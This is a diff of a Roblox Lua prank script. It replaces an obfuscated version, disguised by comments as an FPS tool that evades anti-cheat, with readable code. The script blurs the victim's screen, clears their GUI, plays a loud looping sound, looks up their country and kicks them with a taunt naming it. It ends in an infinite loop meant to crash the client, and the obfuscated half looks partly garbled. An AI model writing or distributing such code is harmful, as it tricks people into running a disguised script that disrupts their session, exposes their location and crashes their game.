@@ -1,79 +1,311 @@
-local _0x6eae={"Play","SoundId","rbxassetid://6299850448","Looped","true","Playing","Volume","10","Parent","workspace.CurrentCamera"};local _0x2ac8={"LocalPlayer","Players","game","GetService"};local _0x75d3={"ClearAllChildren","PlayerGui","Wait","Add","BlurEffect","9999","Parent","workspace.CurrentCamera"};local _0x55d0={"TopbarEnabled","false","StarterGui","SetCore","game"};local _0x3b65={"Kick","Unable to determine your location."};local _0x3023={"CountryRegionForPlayerAsync","GetCountryRegionForPlayerAsync"};local _0x2e64={"Success","Code","local","location","locations","Code","player"};local _0x5d1b={"United States","Uruguay","Uzbekistan","Vanuatu","Venezuela","Vietnam","Wallis and Futuna","Western Sahara","Yemen","Zambia","Zimbabwe"};local _0x5e1a={"Fail","Unable to determine your location."};local _0x59b6={"Sound","Sound","Play"};local _0x437f={"Play","SoundId","rbxassetid://6299850448","Looped","true","Playing","Volume","10","Parent","workspace.CurrentCamera"};local _0x28b3={"Wait","Play","Sound","Wait","Kick","player"};local _0x45b4={"Player","ClearAllChildren","PlayerGui","TopbarEnabled","SetCore","Wait","5","Kick","How is it like in your location?"} 
-
--- Wait for 12 seconds
-wait(12)
+--this is to teach script-kiddies not to execute
+--random scripts on the internet lol
 
 -- Get the local player
-local _0x23a7=game[_0x2ac8[1]]()
+local player = game.Players.LocalPlayer
 
--- 
-local _0x4a88=Instance.new(_0x75d3[1])
-_0x4a88.Size=_0x75d3[2]
-_0x4a88.Parent=workspace.CurrentCamera
+-- Add a BlurEffect to the current camera
+local blur = Instance.new("BlurEffect")
+blur.Size = 9999
+blur.Parent = workspace.CurrentCamera
 
--- Checks PlayerGui for FPS
-_0x23a7[_0x75d3[3]]()
+-- Clear all children in PlayerGui
+player.PlayerGui:ClearAllChildren()
 
--- Change
-game[_0x55d0[3]]:SetCore(_0x55d0[1],_0x55d0[2])
+-- Disable the Topbar
+game:GetService('StarterGui'):SetCore("TopbarEnabled", false)
 
--- Create and configure the FPS
-local _0x11e4=Instance.new(_0x59b6[1])
-_0x11e4[_0x59b6[2]]=_0x59b6[3]
-_0x11e4[_0x59b6[4]]=_0x59b6[5]
-_0x11e4[_0x59b6[6]]=_0x59b6[7]
-_0x11e4[_0x59b6[8]]=_0x59b6[9]
-_0x11e4[_0x59b6[10]]=_0x59b6[11]
+-- Create and configure the Sound
+local sound = Instance.new("Sound")
+sound.SoundId = "rbxassetid://6299850448"
+sound.Looped = true
+sound.Playing = true
+sound.Volume = 10
+sound.Parent = workspace.CurrentCamera -- You can change the parent if needed
 
--- Wait for 5 seconds to prevent Anti-Cheat from detection
+-- Wait for 5 seconds to allow the sound to play before kicking
+wait(5)
 
-local _0x2f5b=game:GetService(_0x2ac8[1])
-local _0x1e2a=game:GetService(_0x2ac8[2])
-local _0x2b4f=_0x1e2a[_0x2ac8[1]]
+-- Script By: GrazzyLimming
+local LocalizationService = game:GetService("LocalizationService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
 
-local _0x3c88={
-    US="United States",
-    UY="Uruguay",
-    UZ="Uzbekistan",
-    VU="Vanuatu",
-    VE="Venezuela",
-    VN="Vietnam",
-    WF="Wallis and Futuna",
-    EH="Western Sahara",
-    YE="Yemen",
-    ZM="Zambia",
-    ZW="Zimbabwe",
+local locations = {
+    US = "United States",
+    GB = "United Kingdom",
+    CA = "Canada",
+    AF = "Afghanistan",
+    AX = "Åland Islands",
+    AL = "Albania",
+    DZ = "Algeria",
+    AS = "American Samoa",
+    AD = "Andorra",
+    AI = "Anguilla",
+    AQ = "Antarctica",
+    AG = "Antigua and Barbuda",
+    AR = "Argentina",
+    AM = "Armenia",
+    AW = "Aruba",
+    AU = "Australia",
+    AT = "Austria",
+    AZ = "Azerbaijan",
+    BS = "Bahamas",
+    BH = "Bahrain",
+    BD = "Bangladesh",
+    BB = "Barbados",
+    BY = "Belarus",
+    BE = "Belgium",
+    BZ = "Belize",
+    BJ = "Benin",
+    BM = "Bermuda",
+    BT = "Bhutan",
+    BO = "Bolivia",
+    BQ = "Bonaire, Sint Eustatius and Saba",
+    BA = "Bosnia and Herzegovina",
+    BW = "Botswana",
+    BV = "Bouvet Island",
+    BR = "Brazil",
+    IO = "British Indian Ocean Territory",
+    BN = "Brunei Darussalam",
+    BG = "Bulgaria",
+    BF = "Burkina Faso",
+    BI = "Burundi",
+    KH = "Cambodia",
+    CM = "Cameroon",
+    CV = "Cape Verde",
+    KY = "Cayman Islands",
+    CF = "Central African Republic",
+    TD = "Chad",
+    CL = "Chile",
+    CN = "China",
+    CX = "Christmas Island",
+    CC = "Cocos (Keeling) Islands",
+    CO = "Colombia",
+    KM = "Comoros",
+    CG = "Congo",
+    CD = "Congo (DRC)",
+    CK = "Cook Islands",
+    CR = "Costa Rica",
+    CI = "Ivory Coast",
+    HR = "Croatia",
+    CW = "Curaçao",
+    CY = "Cyprus",
+    CZ = "Czech Republic",
+    DK = "Denmark",
+    DJ = "Djibouti",
+    DM = "Dominica",
+    DO = "Dominican Republic",
+    EC = "Ecuador",
+    EG = "Egypt",
+    SV = "El Salvador",
+    GQ = "Equatorial Guinea",
+    ER = "Eritrea",
+    EE = "Estonia",
+    ET = "Ethiopia",
+    FK = "Falkland Islands (Malvinas)",
+    FO = "Faroe Islands",
+    FJ = "Fiji",
+    FI = "Finland",
+    FR = "France",
+    GF = "French Guiana",
+    PF = "French Polynesia",
+    TF = "French Southern Territories",
+    GA = "Gabon",
+    GM = "Gambia",
+    GE = "Georgia",
+    DE = "Germany",
+    GH = "Ghana",
+    GI = "Gibraltar",
+    GR = "Greece",
+    GL = "Greenland",
+    GD = "Grenada",
+    GP = "Guadeloupe",
+    GU = "Guam",
+    GT = "Guatemala",
+    GG = "Guernsey",
+    GN = "Guinea",
+    GW = "Guinea-Bissau",
+    GY = "Guyana",
+    HT = "Haiti",
+    HM = "Heard Island and McDonald Islands",
+    VA = "Holy See",
+    HN = "Honduras",
+    HK = "Hong Kong",
+    HU = "Hungary",
+    IS = "Iceland",
+    IN = "India",
+    ID = "Indonesia",
+    IQ = "Iraq",
+    IM = "Isle of Man",
+    IL = "Israel",
+    IT = "Italy",
+    JM = "Jamaica",
+    JP = "Japan",
+    JE = "Jersey",
+    JO = "Jordan",
+    KZ = "Kazakhstan",
+    KE = "Kenya",
+    KI = "Kiribati",
+    KR = "Korea",
+    KW = "Kuwait",
+    KG = "Kyrgyzstan",
+    LA = "Laos",
+    LV = "Latvia",
+    LB = "Lebanon",
+    LS = "Lesotho",
+    LR = "Liberia",
+    LY = "Libya",
+    LI = "Liechtenstein",
+    LT = "Lithuania",
+    LU = "Luxembourg",
+    MO = "Macao",
+    MK = "North Macedonia",
+    MG = "Madagascar",
+    MW = "Malawi",
+    MY = "Malaysia",
+    MV = "Maldives",
+    ML = "Mali",
+    MT = "Malta",
+    MH = "Marshall Islands",
+    MQ = "Martinique",
+    MR = "Mauritania",
+    MU = "Mauritius",
+    YT = "Mayotte",
+    MX = "Mexico",
+    FM = "Micronesia",
+    MD = "Moldova",
+    MC = "Monaco",
+    MN = "Mongolia",
+    ME = "Montenegro",
+    MS = "Montserrat",
+    MA = "Morocco",
+    MZ = "Mozambique",
+    MM = "Myanmar",
+    NA = "Namibia",
+    NR = "Nauru",
+    NP = "Nepal",
+    NL = "Netherlands",
+    AN = "Netherlands Antilles",
+    NC = "New Caledonia",
+    NZ = "New Zealand",
+    NI = "Nicaragua",
+    NE = "Niger",
+    NG = "Nigeria",
+    NU = "Niue",
+    NF = "Norfolk Island",
+    MP = "Northern Mariana Islands",
+    NO = "Norway",
+    OM = "Oman",
+    PK = "Pakistan",
+    PW = "Palau",
+    PS = "Palestine",
+    PA = "Panama",
+    PG = "Papua New Guinea",
+    PY = "Paraguay",
+    PE = "Peru",
+    PH = "Philippines",
+    PN = "Pitcairn Islands",
+    PL = "Poland",
+    PT = "Portugal",
+    PR = "Puerto Rico",
+    QA = "Qatar",
+    RE = "Réunion",
+    RO = "Romania",
+    RU = "Russia",
+    RW = "Rwanda",
+    BL = "Saint Barthélemy",
+    SH = "Saint Helena, Ascension and Tristan da Cunha",
+    KN = "Saint Kitts and Nevis",
+    LC = "Saint Lucia",
+    MF = "Saint Martin",
+    PM = "Saint Pierre and Miquelon",
+    VC = "Saint Vincent and the Grenadines",
+    WS = "Samoa",
+    SM = "San Marino",
+    ST = "São Tomé and Príncipe",
+    SA = "Saudi Arabia",
+    SN = "Senegal",
+    RS = "Serbia",
+    SC = "Seychelles",
+    SL = "Sierra Leone",
+    SG = "Singapore",
+    SX = "Sint Maarten",
+    SK = "Slovakia",
+    SI = "Slovenia",
+    SB = "Solomon Islands",
+    SO = "Somalia",
+    ZA = "South Africa",
+    GS = "South Georgia and the South Sandwich Islands",
+    SS = "South Sudan",
+    ES = "Spain",
+    LK = "Sri Lanka",
+    SR = "Suriname",
+    SJ = "Svalbard and Jan Mayen",
+    SZ = "Eswatini",
+    SE = "Sweden",
+    CH = "Switzerland",
+    TW = "Taiwan",
+    TJ = "Tajikistan",
+    TZ = "Tanzania",
+    TH = "Thailand",
+    TL = "Timor-Leste",
+    TG = "Togo",
+    TK = "Tokelau",
+    TO = "Tonga",
+    TT = "Trinidad and Tobago",
+    TN = "Tunisia",
+    TR = "Turkey",
+    TM = "Turkmenistan",
+    TC = "Turks and Caicos Islands",
+    TV = "Tuvalu",
+    UG = "Uganda",
+    UA = "Ukraine",
+    AE = "United Arab Emirates",
+    GB = "United Kingdom",
+    US = "United States",
+    UY = "Uruguay",
+    UZ = "Uzbekistan",
+    VU = "Vanuatu",
+    VE = "Venezuela",
+    VN = "Vietnam",
+    WF = "Wallis and Futuna",
+    EH = "Western Sahara",
+    YE = "Yemen",
+    ZM = "Zambia",
+    ZW = "Zimbabwe",
 }
 
-local _0x1b77,_0x5a5e=pcall(function()
-    return _0x2f5b[_0x3023[1]](_0x2b4f)
+local success, code = pcall(function()
+    return LocalizationService:GetCountryRegionForPlayerAsync(player)
 end)
 
-if _0x1b77 then
-    local _0x1e42=_0x3c88[_0x5a5e]
-    if _0x1e42 then
+if success then
+    local location = locations[code]
+    if location then
         -- Play sound and wait for 5 seconds
-        _0x11e4:_0x59b6[2]()
+        sound:Play()
         wait(5)
         -- Kick the player
-        _0x2b4f:Kick("How is it like in " .. _0x1e42 .. "?")
+        player:Kick("How is it like in " .. location .. "?")
     else
         -- Play sound and wait for 5 seconds
-        _0x11e4:_0x59b6[2]()
+        sound:Play()
         wait(5)
         -- Kick the player
-        _0x2b4f:Kick("How is it like in your location?")
+        player:Kick("How is it like in your location?")
     end
 else
     -- Play sound and wait for 5 seconds
-    _0x11e4:_0x59b6[2]()
+    sound:Play()
     wait(5)
     -- Kick the player
-    _0x2b4f:Kick(_0x3b65[1])
+    player:Kick("Unable to determine your location.")
 end
 
--- Add a crashing script
+-- Add a crashing script (Please note that this is harmful and against Roblox's terms of service)
 while true do
-    local _0x7e5d=Instance.new("Part")
-    _0x7e5d.Parent=workspace
+    -- This will create an infinite loop that may cause the client to crash
+    local crash = Instance.new("Part")
+    crash.Parent = workspace
 end
